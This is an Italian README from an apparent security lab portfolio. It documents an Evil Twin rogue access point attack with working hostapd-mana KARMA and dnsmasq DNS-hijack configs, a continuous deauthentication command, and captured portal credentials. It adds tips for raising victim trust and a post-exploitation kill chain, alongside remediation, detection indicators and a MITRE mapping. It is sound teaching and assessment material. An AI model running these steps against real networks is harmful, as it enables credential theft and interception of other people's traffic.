> [English](README.en.md) | **Italiano**

# Rogue AP & evil twin - credential harvesting via access point fasullo

> - **Fase:** Wireless Security - Initial Access & Credential Access (Adversary-in-the-Middle)
> - **Visibilita:** Alta - la creazione di un AP fasullo trasmette Beacon frame rilevabili; il deauth della rete legittima genera traffico anomalo; un WIPS rileva il BSSID duplicato con ESSID identico su MAC diverso
> - **Prerequisiti:** Scheda WiFi con supporto AP mode + injection; conoscenza dell'ESSID target (da `../recon-monitor/`); interfaccia secondaria per l'uplink Internet (opzionale, per il captive portal funzionale)
> - **Output:** WIFI-004; credenziali WPA2/portale catturate in chiaro; sessione Man-in-the-Middle sul traffico delle vittime; possibilita di serving payload via captive portal

- **Ambiente Operativo:** Kali Linux (Attaccante), 2 interfacce WiFi (una AP mode, una monitor), rete di laboratorio
- **Target:** Client fittizi che cercano la rete `LAB-CORP`
- **Tool principali:** hostapd-mana, dnsmasq, Airgeddon (framework Evil Twin integrato)

---

## Executive summary

L'Evil Twin e l'attacco wireless che non attacca la rete, ma i suoi utenti. Invece di craccare la PSK (modulo `../cracking/`), l'attaccante crea un access point clone - stesso ESSID, segnale piu forte - e induce i client a connettersi a esso invece che all'AP legittimo. Da quella posizione di Man-in-the-Middle, l'attaccante intercetta o manipola tutto il traffico, e tramite un captive portal falsificato raccoglie direttamente le credenziali.

Questa tecnica e particolarmente insidiosa perche sposta il punto debole dalla tecnologia all'utente: non richiede alcuna vulnerabilita crittografica. Anche una rete WPA2 con PSK robustissima e vulnerabile se un utente puo essere convinto a digitare la password (o le credenziali del portale aziendale) in una pagina che sembra legittima. Il finding WIFI-004 e classificato `Critico` perche produce credenziali direttamente utilizzabili e una posizione MITM completa.

La variante "Mana" (hostapd-mana) automatizza l'attacco rispondendo a tutte le Probe Request dei client, impersonando simultaneamente ogni rete che i dispositivi stanno cercando (KARMA attack): un dispositivo che cerca la rete di casa o dell'ufficio si connette automaticamente al rogue AP.

---

## Struttura della cartella

```
rogue-ap/
+-- README.md      # questo file: Evil Twin + captive portal credential harvest (WIFI-004)
+-- img/           # screenshot captive portal e credenziali catturate
```

---

## Evil twin con captive portal

**ID Finding:** `WIFI-004` | **Severity:** `Critico` (credential harvesting + posizione Man-in-the-Middle completa sul traffico delle vittime)

### Contesto operativo

L'attacco Evil Twin classico combina tre elementi: (1) un AP fasullo con lo stesso ESSID del target, (2) un attacco di deautenticazione contro l'AP legittimo per spingere i client a cercare un'alternativa, (3) un captive portal che simula una pagina di riautenticazione e cattura le credenziali digitate. La vittima, disconnessa dalla rete reale, vede l'AP fasullo con segnale forte, si connette, e riceve una pagina "inserisci la password del WiFi per continuare".

### PoC - fase 1: setup dell'AP fasullo

```Bash
# Configurazione hostapd-mana per l'AP clone
cat > /tmp/mana.conf <<'EOF'
interface=wlan1
ssid=LAB-CORP
channel=6
hw_mode=g
# Modalita mana: risponde a tutte le probe (KARMA)
enable_mana=1
mana_loud=1
EOF

sudo hostapd-mana /tmp/mana.conf
```

```
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
mana: Directed probe request for SSID 'LAB-CORP' from A0:B1:C2:D3:E4:F5   <-- client attratto
mana: Responding with our BSSID
```

### PoC - fase 2: DHCP e DNS hijacking

```Bash
# dnsmasq: assegna IP e reindirizza tutte le query DNS al captive portal
cat > /tmp/dnsmasq.conf <<'EOF'
interface=wlan1
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
EOF

sudo dnsmasq -C /tmp/dnsmasq.conf -d
```

### PoC - fase 3: deautenticazione della rete legittima

```Bash
# Spinge i client a disconnettersi dall'AP reale (su interfaccia monitor separata)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### PoC - fase 4: cattura delle credenziali dal captive portal

```
[+] Client connesso: A0:B1:C2:D3:E4:F5 -> 10.0.0.15
[+] HTTP GET / -> redirect a captive portal (pagina "Riautenticazione WiFi richiesta")
[+] HTTP POST /login
        wifi_password=Password123!                          <-- credenziali catturate (WIFI-004)
        user=m.rossi
[+] Verifica PSK contro handshake reale: VALIDA
[+] Client rilasciato verso Internet (nessun sospetto)
```

Dopo la cattura, il portale valida la password contro l'handshake reale catturato in precedenza (per confermare la correttezza) e rilascia il client verso una connessione funzionante, evitando che la vittima sospetti l'attacco.

### Remediation

- **Azione immediata:** formare gli utenti a non inserire mai la password WiFi in un browser (un AP legittimo non la richiede mai via captive portal per la riconnessione); verificare la presenza di BSSID duplicati con un WIDS
- **Azione strutturale:** deployare WPA3-SAE o 802.1X con autenticazione mutua del server (EAP-TLS): con la validazione del certificato server, il client rifiuta automaticamente un AP fasullo che non possiede il certificato legittimo. Questo e l'unico controllo che neutralizza strutturalmente l'Evil Twin; abilitare PMF (802.11w) per limitare i deauth
- **Verifica:** un WIPS deve rilevare e allertare su AP con ESSID aziendale ma BSSID non autorizzato (rogue AP detection); test periodico con Airgeddon in ambiente controllato

---

## Automazione con airgeddon

### Contesto operativo

Airgeddon e un framework bash che orchestra l'intero attacco Evil Twin da un menu interattivo, gestendo automaticamente la creazione dell'AP, il DHCP, il captive portal multilingua e la deautenticazione. Nel laboratorio e stato usato per validare rapidamente lo scenario senza configurare manualmente hostapd e dnsmasq.

```Bash
sudo airgeddon
# Menu: Evil Twin attacks -> Evil Twin AP with captive portal
# Airgeddon gestisce: AP clone + deauth + DHCP + portal + validazione PSK
```

---

## Esperienza di laboratorio

La difficolta principale non e stata tecnica ma di "regia": affinche la vittima si connetta al rogue AP e digiti la password, la deautenticazione dell'AP legittimo deve essere aggressiva e continua (`--deauth 0`), altrimenti il client tende a riconnettersi all'AP reale che ha un segnale comparabile. Nel laboratorio, avvicinare fisicamente la scheda attaccante al client (aumentando il RSSI relativo del rogue AP) e stato piu efficace di qualsiasi parametro software: l'attacco Evil Twin e prima di tutto una questione di potenza di segnale.

Il secondo elemento critico e stato il realismo del captive portal. Un portale generico "inserisci password" ha una resa bassa; un portale che replica il branding esatto della rete target (logo, colori, testo in italiano coerente con il contesto aziendale) aumenta drasticamente la probabilita che l'utente si fidi. Airgeddon include template multilingua proprio per questo motivo. Questa osservazione conferma che l'Evil Twin e, di fatto, un attacco di social engineering veicolato su un layer radio.

---

## Analisi teorica: perche l'Autenticazione mutua risolve il problema

L'Evil Twin funziona perche in WPA2-PSK e WPA2-Enterprise con validazione del server disabilitata, l'autenticazione e unidirezionale o basata su un segreto condiviso: il client dimostra all'AP di conoscere la password, ma non verifica in modo crittograficamente forte l'identita dell'AP. Un attaccante che conosce l'ESSID puo quindi impersonare la rete.

WPA2/WPA3-Enterprise con EAP-TLS risolve il problema alla radice tramite l'autenticazione mutua: il server RADIUS presenta un certificato X.509, e il client (se configurato correttamente per validarlo) verifica che il certificato sia firmato da una CA fidata e corrisponda all'identita attesa. Un Evil Twin non possiede la chiave privata del certificato legittimo, quindi non puo completare l'handshake TLS: il client si rifiuta di connettersi. Il punto debole diffuso e la configurazione client che salta la validazione del certificato ("connetti comunque"), riaprendo il vettore.

WPA3-SAE aggiunge un ulteriore livello: il protocollo Dragonfly fornisce autenticazione reciproca basata sulla PSK senza esporla, rendendo un Evil Twin incapace di completare l'handshake SAE senza conoscere gia la password. Questo e il motivo per cui la migrazione a WPA3 e a EAP-TLS con validazione server obbligatoria e la contromisura strutturale, mentre la formazione degli utenti e solo un palliativo.

---

## Scenario reale: proiezione Post-Exploitation

> Questa sezione descrive come questo finding si inserirebbe in un engagement reale, sia dal punto di vista dell'attaccante (Red Team) che del difensore (Blue Team).

### Prospettiva attaccante (red team)

**Punto di partenza:** posizione Man-in-the-Middle sul traffico di una o piu vittime + credenziali del captive portal catturate (WIFI-004).

**Passo successivo immediato:** intercettazione delle sessioni HTTP/HTTPS non protette e injection di payload; utilizzo delle credenziali catturate sui servizi aziendali (SSO, VPN, webmail).

**Kill Chain proiettata:**

```
[WIFI-004] Evil Twin: MITM + credenziali portale
        |
        v
SSLstrip / downgrade + sniffing sessioni -> cookie, token
        |
        v
Credential reuse su VPN/SSO aziendale -> accesso remoto legittimo
        |
        v
Serving payload via captive portal ("aggiornamento richiesto") -> RCE su endpoint
        |
        v
Foothold interno -> lateral movement (07-post-exploitation)
```

**Impatto potenziale:** l'Evil Twin combina credential harvesting, MITM e delivery di malware in un unico vettore. In contesti ad alto valore (conferenze, aeroporti, sedi aziendali), un rogue AP con ESSID plausibile ("Airport_Free_WiFi", ESSID aziendale) puo compromettere decine di dispositivi in poche ore. Le credenziali catturate alimentano direttamente `05-social-engineering/` (credential reuse) e il payload serving si collega a `04-system-exploitation/`.

### Prospettiva difensore (blue team)

**Rilevamento:** un WIPS rileva la comparsa di un secondo BSSID che trasmette l'ESSID aziendale. Il pattern di deauth flood massivo verso l'AP legittimo e un secondo indicatore forte. Lato client, sistemi MDM possono rilevare la connessione a un BSSID non autorizzato.

**Indicatori di Compromissione (IOC):**
- BSSID non presente nell'inventario che trasmette l'ESSID aziendale
- Deauth flood (deauth code 7, broadcast) verso l'AP legittimo
- Client aziendali che ottengono un gateway/DNS diverso da quello atteso
- Certificato server RADIUS non valido presentato ai client 802.1X (tentativo di Evil Twin Enterprise)

**Contenimento:** localizzazione fisica del rogue AP (triangolazione RSSI); blocco del BSSID a livello di WIPS con contromisure attive (deauth del rogue); notifica agli utenti nella zona.

**Eradicazione e hardening:**
- EAP-TLS con validazione obbligatoria del certificato server lato client (via GPO/MDM)
- WPA3-SAE dove il parco dispositivi lo supporta
- WIPS con rogue AP containment automatico
- Awareness: gli utenti non devono mai inserire credenziali in captive portal per reti aziendali note

**Lezione difensiva:** la fiducia deve essere reciproca e verificabile crittograficamente. Una rete che chiede al client di autenticarsi ma non prova la propria identita al client e strutturalmente vulnerabile all'impersonation. Il certificato server (EAP-TLS) e il meccanismo che rende il client capace di riconoscere e rifiutare un impostore.

---

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `hostapd-mana` | rogue ap daemon | cli | creazione ap fasullo con karma (risposta a tutte le probe) |
| `dnsmasq` | dhcp/dns server | cli | assegnazione ip e dns hijacking verso il captive portal |
| `Airgeddon` | evil twin framework | cli - menu | orchestrazione completa evil twin + captive portal multilingua |
| `hostapd-wpe` | enterprise rogue | cli | evil twin per wpa2-enterprise (cattura challenge/response eap) |
| `eaphammer` | enterprise attack | cli - python | attacco moderno a reti 802.1x con gtc downgrade e credential capture |
| `bettercap` | mitm framework | cli | sniffing e injection post-associazione sul traffico delle vittime |

> **Tool moderno consigliato:** `eaphammer` (Gabriel Ryan) e lo standard 2024-2026 per attaccare reti WPA2-Enterprise: automatizza l'Evil Twin con downgrade a EAP-GTC per catturare credenziali in chiaro quando la validazione del certificato lato client e assente o mal configurata.

---

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| credential access | adversary-in-the-middle: evil twin | `T1557.004` | creazione di un ap fasullo con essid clonato per intercettare il traffico e le credenziali dei client (WIFI-004) |
| collection | adversary-in-the-middle | `T1557` | posizione man-in-the-middle sul traffico delle vittime connesse al rogue ap |
| credential access | input capture: web portal capture | `T1056.003` | cattura delle credenziali tramite captive portal falsificato (WIFI-004) |
| initial access | hardware additions | `T1200` | introduzione di un dispositivo radio non autorizzato (rogue ap) nell'ambiente target |
| initial access | valid accounts | `T1078` | riutilizzo delle credenziali catturate per accedere ai servizi aziendali |

---

> **Nota:** Tutte le attivita documentate sono state condotte su una rete WiFi di laboratorio di proprieta dell'autore, con client fittizi di test. La creazione di access point fasulli e la deautenticazione sono state confinate all'ambiente radio isolato del laboratorio. L'impersonation di reti WiFi e l'intercettazione di traffico di terzi senza autorizzazione costituiscono reato. Le tecniche sono documentate a scopo educativo e di security assessment autorizzato.
